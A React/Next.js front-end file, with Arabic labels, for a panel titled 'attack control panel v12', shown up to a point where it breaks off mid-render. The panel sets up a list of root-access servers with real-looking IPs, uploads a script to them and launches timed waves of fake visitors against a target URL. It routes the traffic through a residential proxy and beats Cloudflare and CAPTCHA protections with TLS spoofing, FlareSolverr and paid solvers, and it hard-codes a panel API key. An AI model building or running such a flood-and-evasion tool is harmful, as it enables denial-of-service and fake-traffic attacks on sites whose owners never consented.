'use client';
import { useState, useEffect, useRef } from 'react';

export default function Home() {
  const [url, setUrl] = useState('');
  const [durationMin, setDurationMin] = useState('5');
  const [waveSize, setWaveSize] = useState('200');
  const [stayTime, setStayTime] = useState('35');
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [activeAction, setActiveAction] = useState('');
  const [showServerPanel, setShowServerPanel] = useState(false);
  const [servers, setServers] = useState(() => {
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem('servers');
      if (saved) try { return JSON.parse(saved); } catch(e) {}
    }
    return [
      { host: '138.68.141.40', username: 'root' },
      { host: '144.126.234.13', username: 'root' },
      { host: '46.101.52.177', username: 'root' },
      { host: '142.93.41.217', username: 'root' },
      { host: '167.99.94.250', username: 'root' },
      { host: '165.22.118.138', username: 'root' },
      { host: '167.71.135.147', username: 'root' },
      { host: '138.68.141.255', username: 'root' },
      { host: '206.189.21.125', username: 'root' }
    ];
  });
  const [newHost, setNewHost] = useState('');
  const [newUsername, setNewUsername] = useState('root');
  const [useProxy, setUseProxy] = useState(true);
  const [proxyHost, setProxyHost] = useState('proxy.packetstream.io');
  const [proxyPort, setProxyPort] = useState('31112');
  const [proxyUser, setProxyUser] = useState('');
  const [proxyPass, setProxyPass] = useState('');
  const [monitoring, setMonitoring] = useState(false);
  const [serverStatus, setServerStatus] = useState([]);
  const [attackStartTime, setAttackStartTime] = useState(null);
  const [remainingSeconds, setRemainingSeconds] = useState(null);
  const [attackSummary, setAttackSummary] = useState(null);
  const [scanResult, setScanResult] = useState(null);
  const [scanning, setScanning] = useState(false);
  const [socketUrl, setSocketUrl] = useState('');
  const [captchaApiKey, setCaptchaApiKey] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('captchaApiKey') || '';
    return '';
  });
  const [captchaService, setCaptchaService] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('captchaService') || '2captcha';
    return '2captcha';
  });
  const [proxyStatus, setProxyStatus] = useState(null);
  const intervalRef = useRef(null);
  const countdownRef = useRef(null);
  const [panelApiKey, setPanelApiKey] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('panelApiKey') || 'Fadi@Attack2026!SecureKey#X9';
    return 'Fadi@Attack2026!SecureKey#X9';
  });

  // Persist
  useEffect(() => { if (panelApiKey) localStorage.setItem('panelApiKey', panelApiKey); }, [panelApiKey]);
  useEffect(() => { localStorage.setItem('captchaApiKey', captchaApiKey); }, [captchaApiKey]);
  useEffect(() => { localStorage.setItem('captchaService', captchaService); }, [captchaService]);
  useEffect(() => { localStorage.setItem('servers', JSON.stringify(servers)); }, [servers]);

  const addLog = (msg) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev]);

  // Proxy check
  const checkProxy = async () => {
    setProxyStatus('checking');
    try {
      const res = await fetch('/api/proxy-check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ host: proxyHost, port: proxyPort, username: proxyUser, password: proxyPass })
      });
      const data = await res.json();
      setProxyStatus(data.status);
      if (data.status === 'expired') addLog('⚠️ البروكسي منتهي');
      else if (data.status === 'active') addLog('✅ البروكسي شغال');
      else addLog(`⚠️ حالة البروكسي: ${data.message || data.status}`);
    } catch(e) {
      setProxyStatus('error');
      addLog('❌ فشل فحص البروكسي');
    }
  };

  useEffect(() => {
    if (useProxy && proxyHost && proxyPass) checkProxy();
  }, [useProxy, proxyHost, proxyPass]);

  // Dynamic calculations
  const ws = parseInt(waveSize) || 60;
  const calcTotalVisits = (min) => (parseInt(min) || 0) * ws * 2 * servers.length;
  const calcTotalWaves = (min) => (parseInt(min) || 0) * 2;

  const totalVisitsEstimate = calcTotalVisits(durationMin);
  const totalWaves = calcTotalWaves(durationMin);
  const activeVisitorsEstimate = ws * servers.length;

  const formatDuration = (seconds) => {
    if (seconds <= 0) return '0 ثانية';
    if (seconds < 60) return `${seconds} ثانية`;
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return secs === 0 ? `${mins} دقيقة` : `${mins} دقيقة و ${secs} ثانية`;
  };

  const formatTime = (seconds) => {
    const m = Math.floor(seconds / 60);
    const s = Math.round(seconds % 60);
    return `${m}:${String(s).padStart(2, '0')}`;
  };

  // Countdown
  useEffect(() => {
    if (attackStartTime && monitoring && serverStatus.length > 0) {
      const finishedServers = serverStatus.filter(s => s.status === 'finished');
      const totalDone = serverStatus.reduce((sum, s) => sum + (s.visits || 0), 0);
      const totalTarget = serverStatus.reduce((sum, s) => sum + (s.target || 0), 0);
      const maxElapsed = Math.max(...serverStatus.map(s => s.elapsed || 0), 1);
      if (totalDone > 0 && totalTarget > 0) {
        const realSpeed = totalDone / maxElapsed;
        const remaining = totalTarget - totalDone;
        if (realSpeed > 0) setRemainingSeconds(Math.ceil(remaining / realSpeed));
      }
      const activeServers = serverStatus.filter(s => s.status === 'running' || s.status === 'starting');
      if (activeServers.length === 0 && finishedServers.length > 0) setRemainingSeconds(0);
    }
  }, [serverStatus, attackStartTime, monitoring]);

  useEffect(() => {
    if (remainingSeconds !== null && remainingSeconds > 0 && monitoring) {
      countdownRef.current = setInterval(() => {
        setRemainingSeconds(prev => prev !== null && prev > 0 ? prev - 1 : 0);
      }, 1000);
      return () => clearInterval(countdownRef.current);
    }
  }, [remainingSeconds, monitoring]);

  // Fetch status
  const fetchStatus = async () => {
    try {
      const res = await fetch('/api/status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ servers })
      });
      const data = await res.json();
      if (data.results) {
        const filtered = data.results.map(s => {
          if (s.status === 'finished' && !attackStartTime) return { ...s, status: 'idle', visits: 0, target: 0, progress: 0, elapsed: 0, errors: 0 };
          if (s.timestamp && attackStartTime && (s.timestamp * 1000) < attackStartTime) return { ...s, status: 'starting', visits: 0, target: ws * totalWaves, progress: 0, elapsed: 0, errors: 0 };
          return s;
        });
        setServerStatus(filtered);
        const activeServers = filtered.filter(s => s.status === 'running');
        const finishedServers = filtered.filter(s => s.status === 'finished');
        if (activeServers.length === 0 && finishedServers.length > 0) {
          stopMonitoring();
          const sumVisits = filtered.reduce((sum, s) => sum + (s.visits || 0), 0);
          const sumErrors = filtered.reduce((sum, s) => sum + (s.errors || 0), 0);
          const maxElapsed = Math.max(...filtered.map(s => s.elapsed || 0), 0);
          const totalRate = maxElapsed > 0 ? Math.round((sumVisits / maxElapsed) * 60) : 0;
          const totalActive = filtered.reduce((sum, s) => sum + (s.active_visitors || 0), 0);
          const peakActive = Math.max(...filtered.map(s => s.peak_active || 0), 0);
          setAttackSummary({ target: totalVisitsEstimate, visits: sumVisits, errors: sumErrors, elapsed: maxElapsed, rate: totalRate, activeVisitors: totalActive, peakActive });
          addLog(`✅ انتهت جميع العمليات | ${sumVisits} زيارة | ${sumErrors} خطأ | ${formatTime(maxElapsed)} | ${totalRate}/دقيقة`);
        }
      }
    } catch (err) {}
  };

  const startMonitoring = () => { setMonitoring(true); fetchStatus(); intervalRef.current = setInterval(fetchStatus, 15000); };
  const stopMonitoring = () => { setMonitoring(false); if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; } };
  useEffect(() => { return () => { if (intervalRef.current) clearInterval(intervalRef.current); }; }, []);

  const addServer = () => {
    if (!newHost) return addLog('❌ الرجاء إدخال عنوان IP');
    if (servers.find(s => s.host === newHost)) return addLog('❌ السيرفر موجود');
    setServers(prev => [...prev, { host: newHost, username: newUsername || 'root' }]);
    addLog(`✅ تمت إضافة: ${newHost}`);
    setNewHost(''); setNewUsername('root');
  };
  const removeServer = (host) => { setServers(prev => prev.filter(s => s.host !== host)); addLog(`🗑️ تم حذف: ${host}`); };

  const buildProxyList = () => {
    if (!useProxy || !proxyUser || !proxyPass) return [];
    return [{ host: proxyHost, port: proxyPort, username: proxyUser, password: proxyPass }];
  };

  // Scan site
  const handleScan = async () => {
    if (!url) return addLog('❌ ادخل الرابط أولاً');
    if (!/^https?:\/\//i.test(url)) return addLog('❌ الرابط لازم يبدأ بـ http:// أو https://');
    setScanning(true);
    setScanResult(null);
    addLog(`🔍 جاري فحص ${url}...`);
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'scan', url, servers, proxies: buildProxyList() })
      });
      const data = await res.json();
      if (data.scanResult) {
        setScanResult(data.scanResult);
        const modeNames = { socketio: '🔌 Socket.IO (أسرع)', cloudflare: '☁️ Cloudflare (FlareSolverr)', http: '🌐 HTTP مباشر' };
        addLog(`✅ نتيجة الفحص: ${modeNames[data.scanResult.mode] || data.scanResult.mode} | ${data.scanResult.pages?.length || 0} صفحات`);
      } else {
        addLog(`⚠️ فشل الفحص: ${data.raw || data.error || 'غير معروف'}`);
      }
    } catch(e) {
      addLog(`❌ خطأ في الفحص: ${e.message}`);
    }
    setScanning(false);
  };

  const handleAction = async (action) => {
    if (!panelApiKey) return addLog('❌ ادخل مفتاح API أولاً');
    if (action === 'start' && !url) return addLog('❌ ادخل الرابط أولاً');
    if (action === 'start' && !/^https?:\/\//i.test(url)) return addLog('❌ الرابط لازم يبدأ بـ http:// أو https://');
    if (servers.length === 0) return addLog('❌ لا يوجد سيرفرات');

    setLoading(true); setActiveAction(action);
    const actionNames = { setup: 'تجهيز السيرفرات', deploy: 'رفع السكريبت', start: 'بدء الهجوم', stop: 'إيقاف الكل' };
    addLog(`🚀 جاري ${actionNames[action]}...`);

    if (action === 'start') {
      addLog(`📊 المدة: ${durationMin} دقيقة | الموجة: ${waveSize} زائر | البقاء: ${stayTime}ث | 👥 ~${activeVisitorsEstimate} نشط`);
      stopMonitoring(); setServerStatus([]); setAttackStartTime(null); setRemainingSeconds(null); setAttackSummary(null);
    }

    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action, url, durationMin: parseInt(durationMin), waveSize: parseInt(waveSize), stayTime: parseInt(stayTime), servers, proxies: buildProxyList(), socketUrl: socketUrl || undefined, captchaApiKey: captchaApiKey || undefined, captchaService: captchaService || undefined })
      });
      const data = await res.json();
      if (data.error) {
        addLog(`❌ ${data.error}`);
      } else {
        data.results.forEach(r => {
          addLog(r.status === 'success' ? `✅ ${r.host}: ${r.output || 'تم'}` : `❌ ${r.host}: ${r.error}`);
        });
        if (action === 'start') {
          setAttackStartTime(Date.now());
          setRemainingSeconds(parseInt(durationMin) * 60);
          addLog('⏳ انتظار بدء العمليات...');
          setTimeout(startMonitoring, 8000);
        }
        if (action === 'stop') { stopMonitoring(); setServerStatus([]); setAttackStartTime(null); setRemainingSeconds(null); }
      }
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    setLoading(false); setActiveAction('');
  };

  const getStatusColor = (s) => ({ running:'#22c55e', starting:'#facc15', finished:'#3b82f6', idle:'#6b7280', offline:'#ef4444' }[s] || '#6b7280');
  const getStatusText = (s) => ({ running:'🟢 شغال', starting:'🟡 يبدأ...', finished:'🔵 انتهى', idle:'⚪ خامل', offline:'🔴 غير متصل' }[s] || '⚪');
  const getModeText = (m) => ({ socketio:'🔌 SOCKET', cloudflare:'☁️ FLARE', http:'🌐 HTTP', socket_wave:'🔌 SOCKET', wave_cf:'☁️ FLARE', wave_fast:'🌐 HTTP', detecting:'🔍 SCAN' }[m] || m || '');
  const getModeColor = (m) => ({ socketio:'#06b6d4', cloudflare:'#f97316', http:'#22c55e', socket_wave:'#06b6d4', wave_cf:'#f97316', wave_fast:'#22c55e', detecting:'#facc15' }[m] || '#6b7280');

  const ff = "'Courier New', 'Noto Sans Arabic', 'Segoe UI', Tahoma, monospace";
  const s = {
    page: { minHeight:'100vh', backgroundColor:'#000', color:'#22c55e', padding:'24px', fontFamily:ff, direction:'rtl' },
    box: { maxWidth:'850px', margin:'0 auto', border:'1px solid #166534', padding:'24px', borderRadius:'12px', backgroundColor:'#111827' },
    title: { fontSize:'26px', fontWeight:'bold', marginBottom:'20px', textAlign:'center', borderBottom:'1px solid #166534', paddingBottom:'12px', color:'#22c55e' },
    input: { width:'100%', backgroundColor:'#000', border:'1px solid #166534', padding:'10px 12px', borderRadius:'6px', color:'#fff', fontSize:'14px', fontFamily:ff, outline:'none', boxSizing:'border-box' },
    inputSm: { width:'80px', backgroundColor:'#000', border:'1px solid #166534', padding:'10px', borderRadius:'6px', color:'#fff', fontSize:'14px', fontFamily:ff, outline:'none', textAlign:'center' },
    label: { display:'block', marginBottom:'6px', fontSize:'13px', color:'#22c55e' },
    btn: (bg) => ({ display:'flex', alignItems:'center', justifyContent:'center', gap:'6px', backgroundColor:bg, color:'#fff', padding:'14px 8px', borderRadius:'8px', cursor:'pointer', border:'none', fontSize:'13px', fontFamily:ff, transition:'opacity 0.2s' }),
    card: { backgroundColor:'#111827', border:'1px solid #1f2937', borderRadius:'8px', padding:'14px', marginBottom:'10px' },
    badge: (c) => ({ fontSize:'11px', padding:'2px 8px', borderRadius:'12px', color:c, border:`1px solid ${c}`, fontFamily:ff }),
  };

  // Totals
  const totalVisits = serverStatus.reduce((sum, x) => sum + (x.visits || 0), 0);
  const totalErrors = serverStatus.reduce((sum, x) => sum + (x.errors || 0), 0);
  const totalActiveVisitors = serverStatus.reduce((sum, x) => sum + (x.active_visitors || 0), 0);

  return (
    <div style={s.page}>
      <div style={s.box}>
        <h1 style={s.title}>⚔️ لوحة تحكم الهجوم v12</h1>

        {/* API Key */}
        <div style={{ marginBottom:'14px' }}>
          <div style={{ display:'flex', alignItems:'center', gap:'8px', marginBottom:'6px' }}>
            <label style={{ fontSize:'13px', color:'#ef4444' }}>🔑 مفتاح الدخول</label>
            <span style={{ fontSize:'11px', color: panelApiKey ? '#22c55e' : '#ef4444' }}>{panelApiKey ? '🔒 مُدخل' : '⚠️ مطلوب'}</span>
          </div>
          <input type="password" value={panelApiKey} onChange={(e) => setPanelApiKey(e.target.value)} placeholder="API Key..." style={{...s.input, borderColor: panelApiKey ? '#22c55e' : '#ef4444'}} />
        </div>

        {/* Servers */}
        <div style={{ marginBottom:'16px' }}>
          <button onClick={() => setShowServerPanel(!showServerPanel)} style={{ display:'flex', alignItems:'center', gap:'6px', fontSize:'13px', color:'#facc15', cursor:'pointer', background:'none', border:'none', fontFamily:ff }}>
            🖥️ السيرفرات ({servers.length}) {showServerPanel ? '▲' : '▼'}
          </button>
          {showServerPanel && (
            <div style={{ border:'1px solid #14532d', borderRadius:'8px', padding:'12px', marginTop:'8px', backgroundColor:'#000' }}>
              {servers.map((sv, i) => (
                <div key={i} style={{ display:'flex', alignItems:'center', justifyContent:'space-between', backgroundColor:'#111827', padding:'6px 10px', borderRadius:'6px', fontSize:'13px', color:'#4ade80', marginBottom:'6px' }}>
                  <span>🖥️ {sv.host}</span>
                  <button onClick={() => removeServer(sv.host)} style={{ color:'#ef4444', cursor:'pointer', background:'none', border:'none', fontSize:'14px' }}>🗑️</button>
                </div>
              ))}
              <div style={{ display:'flex', gap:'6px', marginTop:'8px' }}>
                <input type="text" value={newHost} onChange={(e) => setNewHost(e.target.value)} placeholder="IP" style={{...s.input, flex:1}} />
                <button onClick={addServer} style={s.btn('#14532d')}>+ إضافة</button>
              </div>
            </div>
          )}
        </div>

        {/* Proxy */}
        <div style={{ marginBottom:'14px' }}>
          <div style={{ display:'flex', alignItems:'center', gap:'10px', marginBottom:'8px' }}>
            <label style={{ fontSize:'13px', color:'#22c55e' }}>🌐 بروكسي سعودي</label>
            <button onClick={() => setUseProxy(!useProxy)} style={{ background: useProxy ? '#22c55e' : '#374151', color:'#fff', border:'none', padding:'3px 14px', borderRadius:'12px', cursor:'pointer', fontSize:'11px', fontFamily:ff }}>
              {useProxy ? '✅ مفعّل' : '❌ معطّل'}
            </button>
            {useProxy && proxyStatus === 'active' && <span style={{ background:'#166534', color:'#4ade80', padding:'3px 10px', borderRadius:'12px', fontSize:'11px' }}>✅ شغال</span>}
            {useProxy && proxyStatus === 'expired' && <span style={{ background:'#dc2626', color:'#fff', padding:'3px 10px', borderRadius:'12px', fontSize:'11px' }}>⚠️ منتهي</span>}
            {useProxy && proxyStatus !== 'checking' && <button onClick={checkProxy} style={{ background:'none', border:'1px solid #374151', color:'#9ca3af', padding:'3px 8px', borderRadius:'6px', cursor:'pointer', fontSize:'10px', fontFamily:ff }}>🔄</button>}
          </div>
          {useProxy && (
            <div style={{ border:'1px solid #14532d', borderRadius:'8px', padding:'12px', backgroundColor:'#000' }}>
              <div style={{ display:'grid', gridTemplateColumns:'2fr 1fr', gap:'6px', marginBottom:'6px' }}>
                <div><label style={{ fontSize:'10px', color:'#6b7280' }}>Host</label><input type="text" value={proxyHost} onChange={(e) => setProxyHost(e.target.value)} style={s.input} /></div>
                <div><label style={{ fontSize:'10px', color:'#6b7280' }}>Port</label><input type="text" value={proxyPort} onChange={(e) => setProxyPort(e.target.value)} style={s.input} /></div>
              </div>
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'6px' }}>
                <div><label style={{ fontSize:'10px', color:'#6b7280' }}>Username</label><input type="text" value={proxyUser} onChange={(e) => setProxyUser(e.target.value)} style={s.input} /></div>
                <div><label style={{ fontSize:'10px', color:'#6b7280' }}>Password</label><input type="text" value={proxyPass} onChange={(e) => setProxyPass(e.target.value)} style={s.input} /></div>
              </div>
            </div>
          )}
        </div>

        {/* Target URL + Scan */}
        <div style={{ marginBottom:'12px' }}>
          <label style={s.label}>🔗 الرابط المستهدف</label>
          <div style={{ display:'flex', gap:'8px' }}>
            <input type="text" value={url} onChange={(e) => { setUrl(e.target.value); setScanResult(null); }} placeholder="https://example.com" style={{...s.input, flex:1}} />
            <button onClick={handleScan} disabled={scanning} style={{...s.btn('#7c3aed'), opacity: scanning ? 0.5 : 1, minWidth:'100px'}}>
              {scanning ? '⏳ يفحص...' : '🔍 فحص ذكي'}
            </button>
          </div>
        </div>

        {/* Socket URL (optional) */}
        <div style={{ marginBottom:'12px' }}>
          <label style={{...s.label, color:'#06b6d4'}}>🔌 Socket URL (اختياري - للمواقع اللي عندها Socket.IO خلف Cloudflare)</label>
          <input type="text" value={socketUrl} onChange={(e) => setSocketUrl(e.target.value)} placeholder="https://server.onrender.com (اتركه فاضي للفحص التلقائي)" style={{...s.input, borderColor: socketUrl ? '#06b6d4' : '#166534'}} />
          {socketUrl && <div style={{ marginTop:'4px', fontSize:'10px', color:'#06b6d4' }}>🔌 سيتم استخدام Socket.IO مباشرة على: {socketUrl}</div>}
        </div>

        {/* CAPTCHA Solver */}
        <div style={{ marginBottom:'12px' }}>
          <label style={{...s.label, color:'#f59e0b'}}>🔑 CAPTCHA Solver (اختياري - لتجاوز Turnstile/reCAPTCHA/hCaptcha)</label>
          <div style={{ display:'grid', gridTemplateColumns:'2fr 1fr', gap:'8px' }}>
            <input type="text" value={captchaApiKey} onChange={(e) => setCaptchaApiKey(e.target.value)} placeholder="API Key من 2Captcha أو CapSolver" style={{...s.input, borderColor: captchaApiKey ? '#f59e0b' : '#166534'}} />
            <select value={captchaService} onChange={(e) => setCaptchaService(e.target.value)} style={{...s.input, borderColor:'#f59e0b'}}>
              <option value="2captcha">2Captcha</option>
              <option value="capsolver">CapSolver</option>
            </select>
          </div>
          {captchaApiKey && <div style={{ marginTop:'4px', fontSize:'10px', color:'#f59e0b' }}>🔑 سيتم حل CAPTCHA تلقائياً عبر {captchaService}</div>}
          {!captchaApiKey && <div style={{ marginTop:'4px', fontSize:'10px', color:'#6b7280' }}>بدون مفتاح = يتجاوز بـ TLS spoofing فقط (يشتغل مع أغلب المواقع)</div>}
        </div>

        {/* Scan Result */}
        {scanResult && (
          <div style={{ border:'1px solid #7c3aed', borderRadius:'8px', padding:'14px', marginBottom:'14px', backgroundColor:'#1a1033' }}>
            <div style={{ fontSize:'14px', color:'#a78bfa', marginBottom:'10px', fontWeight:'bold' }}>📋 نتيجة الفحص الذكي</div>
            <div style={{ display:'grid', gridTemplateColumns:'repeat(3, 1fr)', gap:'10px' }}>
              <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:`1px solid ${getModeColor(scanResult.mode)}` }}>
                <div style={{ fontSize:'22px', color: getModeColor(scanResult.mode) }}>{getModeText(scanResult.mode)}</div>
                <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>الوضع المكتشف</div>
              </div>
              <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #374151' }}>
                <div style={{ fontSize:'22px', color: scanResult.has_cloudflare ? '#f97316' : '#22c55e' }}>{scanResult.has_cloudflare ? '☁️ نعم' : '✅ لا'}</div>
                <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>Cloudflare</div>
              </div>
              <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #374151' }}>
                <div style={{ fontSize:'22px', color:'#06b6d4' }}>{scanResult.pages?.length || 0}</div>
                <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>صفحات مكتشفة</div>
              </div>
            </div>
            {scanResult.socket_url && (
              <div style={{ marginTop:'8px', fontSize:'11px', color:'#06b6d4' }}>🔌 Socket: {scanResult.socket_url}</div>
            )}
            {scanResult.mode === 'socketio' && (
              <div style={{ marginTop:'6px', fontSize:'11px', color:'#4ade80', backgroundColor:'#052e16', padding:'6px 10px', borderRadius:'6px' }}>
                ⚡ وضع Socket.IO - أسرع وضع! الزوار يظهرون كـ "نشطين" مباشرة بدون Cloudflare bypass
              </div>
            )}
            {scanResult.protection && scanResult.protection !== 'none' && (
              <div style={{ marginTop:'8px', fontSize:'11px', color:'#f97316' }}>🛡️ حماية: {scanResult.protection.toUpperCase()}</div>
            )}
            {scanResult.captcha_type && (
              <div style={{ marginTop:'4px', fontSize:'11px', color:'#f59e0b' }}>🔑 CAPTCHA: {scanResult.captcha_type} {captchaApiKey ? '(سيتم حله تلقائياً)' : '(أضف مفتاح CAPTCHA لتجاوزه)'}</div>
            )}
            {scanResult.mode === 'cloudflare' && (
              <div style={{ marginTop:'6px', fontSize:'11px', color:'#fbbf24', backgroundColor:'#451a03', padding:'6px 10px', borderRadius:'6px' }}>
                ☁️ وضع الحماية المتقدمة - TLS spoofing + {captchaApiKey ? 'CAPTCHA solver' : 'FlareSolverr'}
              </div>
            )}
            {scanResult.mode === 'http' && (
              <div style={{ marginTop:'6px', fontSize:'11px', color:'#4ade80', backgroundColor:'#052e16', padding:'6px 10px', borderRadius:'6px' }}>
                🌐 وضع HTTP مباشر - سريع! بدون حماية
              </div>
            )}
          </div>
        )}

        {/* Settings */}
        <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'10px', marginBottom:'12px' }}>
          <div>
            <label style={s.label}>⏱️ المدة (دقائق)</label>
            <input type="number" value={durationMin} onChange={(e) => setDurationMin(e.target.value)} min="1" style={{...s.input, textAlign:'center'}} />
          </div>
          <div>
            <label style={s.label}>🌊 حجم الموجة</label>
            <input type="number" value={waveSize} onChange={(e) => setWaveSize(e.target.value)} min="10" max="500" style={{...s.input, textAlign:'center'}} />
          </div>
          <div>
            <label style={s.label}>⏳ مدة البقاء (ثانية)</label>
            <input type="number" value={stayTime} onChange={(e) => setStayTime(e.target.value)} min="10" max="120" style={{...s.input, textAlign:'center'}} />
          </div>
        </div>

        {/* Countdown */}
        {remainingSeconds !== null && (
          <div style={{ textAlign:'center', padding:'10px', marginBottom:'12px', backgroundColor: remainingSeconds === 0 ? '#052e16' : '#1a1a2e', border:`1px solid ${remainingSeconds === 0 ? '#22c55e' : '#facc15'}`, borderRadius:'8px' }}>
            <div style={{ fontSize:'22px', fontWeight:'bold', color: remainingSeconds === 0 ? '#22c55e' : '#facc15' }}>
              {remainingSeconds === 0 ? '✅ انتهى!' : `⏳ ${formatDuration(remainingSeconds)}`}
            </div>
          </div>
        )}

        {/* Stats Preview */}
        <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'8px', marginBottom:'14px', padding:'10px', backgroundColor:'#0a1628', borderRadius:'8px', border:'1px solid #1e3a5f' }}>
          <div style={{ textAlign:'center' }}>
            <div style={{ fontSize:'18px', fontWeight:'bold', color:'#06b6d4' }}>{totalVisitsEstimate.toLocaleString()}</div>
            <div style={{ fontSize:'9px', color:'#6b7280' }}>إجمالي الزيارات</div>
          </div>
          <div style={{ textAlign:'center' }}>
            <div style={{ fontSize:'18px', fontWeight:'bold', color:'#22c55e' }}>👥 {activeVisitorsEstimate}</div>
            <div style={{ fontSize:'9px', color:'#6b7280' }}>زائر نشط دائماً</div>
          </div>
          <div style={{ textAlign:'center' }}>
            <div style={{ fontSize:'18px', fontWeight:'bold', color:'#facc15' }}>🌊 {totalWaves * servers.length}</div>
            <div style={{ fontSize:'9px', color:'#6b7280' }}>إجمالي الموجات</div>
          </div>
          <div style={{ textAlign:'center' }}>
            <div style={{ fontSize:'18px', fontWeight:'bold', color:'#a855f7' }}>{stayTime}s</div>
            <div style={{ fontSize:'9px', color:'#6b7280' }}>مدة بقاء الزائر</div>
          </div>
        </div>

        {/* Control Buttons */}
        <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'10px' }}>
          <button onClick={() => handleAction('setup')} disabled={loading} style={{...s.btn('#581c87'), opacity: loading ? 0.5 : 1}}>
            {activeAction === 'setup' ? '⏳' : '⚙️'} تجهيز
          </button>
          <button onClick={() => handleAction('deploy')} disabled={loading} style={{...s.btn('#1e3a5f'), opacity: loading ? 0.5 : 1}}>
            {activeAction === 'deploy' ? '⏳' : '📤'} رفع السكريبت
          </button>
          <button onClick={() => handleAction('start')} disabled={loading} style={{...s.btn('#7f1d1d'), opacity: loading ? 0.5 : 1}}>
            {activeAction === 'start' ? '⏳' : '▶️'} بدء الهجوم
          </button>
          <button onClick={() => handleAction('stop')} disabled={loading} style={{...s.btn('#374151'), opacity: loading ? 0.5 : 1}}>
            {activeAction === 'stop' ? '⏳' : '⏹️'} إيقاف
          </button>
        </div>

        {/* Live Monitoring */}
        {(serverStatus.length > 0 || monitoring) && (
          <div style={{ marginTop:'20px', border:'1px solid #14532d', borderRadius:'8px', padding:'14px', backgroundColor:'#0a0a0a' }}>
            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'12px' }}>
              <span style={{ fontSize:'14px', color:'#22c55e' }}>📡 المراقبة الحية {monitoring && <span style={{ color:'#22c55e', fontSize:'11px' }}>(كل 15ث)</span>}</span>
              <div style={{ display:'flex', gap:'6px' }}>
                {!monitoring && <button onClick={startMonitoring} style={{ fontSize:'11px', color:'#22c55e', cursor:'pointer', background:'none', border:'1px solid #22c55e', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>▶</button>}
                {monitoring && <button onClick={stopMonitoring} style={{ fontSize:'11px', color:'#ef4444', cursor:'pointer', background:'none', border:'1px solid #ef4444', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>⏹</button>}
                <button onClick={fetchStatus} style={{ fontSize:'11px', color:'#6b7280', cursor:'pointer', background:'none', border:'1px solid #374151', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>🔄</button>
              </div>
            </div>

            {/* Active Visitors Banner */}
            {totalActiveVisitors > 0 && (
              <div style={{ textAlign:'center', padding:'10px', marginBottom:'10px', backgroundColor:'#052e16', border:'1px solid #22c55e', borderRadius:'8px' }}>
                <div style={{ fontSize:'26px', fontWeight:'bold', color:'#22c55e' }}>👥 {totalActiveVisitors}</div>
                <div style={{ fontSize:'11px', color:'#4ade80' }}>زائر نشط الآن</div>
              </div>
            )}

            {/* Server Cards */}
            {serverStatus.map((sv, i) => (
              <div key={i} style={s.card}>
                <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'10px' }}>
                  <span style={{ fontSize:'13px', color:'#9ca3af' }}>🖥️ {sv.host}</span>
                  <div style={{ display:'flex', gap:'6px', alignItems:'center' }}>
                    {sv.mode && <span style={s.badge(getModeColor(sv.mode))}>{getModeText(sv.mode)}</span>}
                    <span style={s.badge(getStatusColor(sv.status))}>{getStatusText(sv.status)}</span>
                  </div>
                </div>
                {sv.active_visitors > 0 && <div style={{ fontSize:'11px', color:'#06b6d4', textAlign:'center', marginBottom:'6px' }}>👥 {sv.active_visitors} نشط | 🌊 {sv.waves_done || 0}/{sv.total_waves || 0}</div>}
                {sv.rate > 0 && <div style={{ fontSize:'11px', color:'#4ade80', textAlign:'center', marginBottom:'6px' }}>⚡ {sv.rate}/دقيقة</div>}
                {sv.status !== 'offline' && sv.status !== 'idle' && (
                  <>
                    <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'6px', marginBottom:'8px' }}>
                      {[
                        { v: (sv.visits||0).toLocaleString(), l:'زيارات', c:'#fff' },
                        { v: (sv.target||0).toLocaleString(), l:'الهدف', c:'#fff' },
                        { v: formatTime(sv.elapsed||0), l:'الوقت', c:'#4ade80' },
                        { v: sv.errors||0, l:'أخطاء', c: (sv.errors||0) > 0 ? '#ef4444' : '#22c55e' },
                      ].map((x, j) => (
                        <div key={j} style={{ textAlign:'center', padding:'6px', backgroundColor:'#000', borderRadius:'6px', border:'1px solid #1f2937' }}>
                          <div style={{ fontSize:'16px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                          <div style={{ fontSize:'9px', color:'#6b7280' }}>{x.l}</div>
                        </div>
                      ))}
                    </div>
                    <div style={{ width:'100%', height:'6px', backgroundColor:'#1f2937', borderRadius:'4px', overflow:'hidden' }}>
